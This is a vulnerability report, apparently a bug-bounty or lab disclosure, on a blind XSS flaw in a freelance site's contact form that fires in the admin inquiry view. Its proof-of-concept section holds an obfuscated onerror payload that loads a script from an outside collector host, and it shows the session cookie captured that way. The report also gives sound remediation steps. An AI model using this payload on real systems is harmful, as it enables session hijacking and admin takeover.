## Title
Blind XSS in Contact Form Message Parameter - Freelance Full-Stack Developer

## Description
**Affected URL:** https://freelance.pwnedbox.site/index.php#contact (triggers on https://freelance.pwnedbox.site/admin/inquiry.php?id=1)

A Blind Cross-Site Scripting (XSS) vulnerability exists in the public contact form on `freelance.pwnedbox.site`. Input entered into the `Message` field is stored without HTML encoding and renders directly in the DOM when an administrator views the inquiry in the backend (`/admin/inquiry.php`). Because the script executes inside an authenticated admin session, an attacker can exfiltrate session cookies and compromise the admin panel.

## Steps to Reproduce
1. Go to `https://freelance.pwnedbox.site/index.php#contact`, fill in the required fields, paste the Blind XSS payload into the **Message** box, and click **Send Project Inquiry**.
2. Log in to the admin panel (`https://freelance.pwnedbox.site/admin/index.php`) and open the submitted inquiry (`/admin/inquiry.php?id=1`).
3. Observe the payload execute immediately in the **Message** section, sending an out-of-band callback with the admin's `PHPSESSID` cookie and page details.

## POC (Proof of Concept)
**Injection Endpoint:** `https://freelance.pwnedbox.site/index.php#contact` (`Message` field)

**Trigger Endpoint:** `https://freelance.pwnedbox.site/admin/inquiry.php?id=1`

**Payload:**
```html
"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3JhcGlkbmV3dDYzMTAxIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>
```

**Out-of-Band Callback Data Captured:**
- **Triggered URI:** `https://freelance.pwnedbox.site/admin/inquiry.php?id=1`
- **Referrer:** `https://freelance.pwnedbox.site/admin/index.php`
- **Exfiltrated Session Cookie:** `PHPSESSID=45554667e9c686935915bdfb481de5c0`

**Visual Evidence:**
- Contact form submission on `freelance.pwnedbox.site/index.php#contact` with the payload in the `Message` field.
  <img width="1406" height="1011" alt="image" src="https://github.com/user-attachments/assets/71ee1de9-23e3-42d8-b35e-e864cefc8373" /><br><br>

- Admin dashboard (`/admin/index.php`) displaying the newly received inquiry.
  <img width="1668" height="663" alt="Screenshot 2026-11-27 164428" src="https://github.com/user-attachments/assets/a7effc43-d72b-40c0-a639-919c6cbf0452" /><br><br>
- Inquiry detail page (`/admin/inquiry.php?id=1`) showing the rendered broken image icon inside the **Message** box where the script fired.
  <img width="1742" height="782" alt="image" src="https://github.com/user-attachments/assets/c6e1ad86-13dd-4514-a1be-299918184cd9" /><br><br>

- Blind XSS collector report confirming execution on `/admin/inquiry.php?id=1` and capturing the admin's `PHPSESSID` cookie and screenshot.
  <img width="1533" height="1031" alt="Screenshot 2026-11-27 164407" src="https://github.com/user-attachments/assets/5d88dd67-dd9c-4bb4-9a26-87cead654a4e" /><br>


## Impact
Because the payload executes automatically when an administrator reviews incoming inquiries:
- **Admin Account Takeover:** Attackers can steal the administrator's `PHPSESSID` cookie and hijack their active session.
- **Unauthorized Data Access:** Full access to view, modify, or delete client inquiries and sensitive business records.
- **Persistent Compromise:** Attackers can use the hijacked admin session to make unauthorized changes across the application.

## Remediation
1. **Encode Output:** Apply `htmlspecialchars($input, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8')` to all user-supplied fields before rendering them in `/admin/inquiry.php` and `/admin/index.php`.
2. **Protect Session Cookies:** Set the `HttpOnly`, `Secure`, and `SameSite=Strict` flags on `PHPSESSID` so JavaScript cannot access session tokens via `document.cookie`.
3. **Add a Content Security Policy (CSP):** Enforce a strict CSP header on `/admin/` pages (e.g., `default-src 'self'; script-src 'self';`) to block inline event handlers like `onerror` and restrict external requests.
